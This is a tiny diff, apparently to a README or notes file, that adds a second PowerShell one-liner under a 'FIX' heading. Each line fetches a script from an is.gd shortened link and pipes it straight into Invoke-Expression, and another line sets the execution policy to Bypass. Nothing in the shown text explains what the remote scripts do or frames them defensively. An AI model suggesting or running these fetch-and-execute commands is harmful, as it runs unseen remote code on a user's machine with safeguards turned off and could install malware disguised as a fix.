@@ -4,5 +4,6 @@
 
 FIX
 #### irm https://is.gd/xcafix | iex
+#### irm https://is.gd/androidfix | iex
 
 *** Set-ExecutionPolicy Bypass -Scope Process -Force
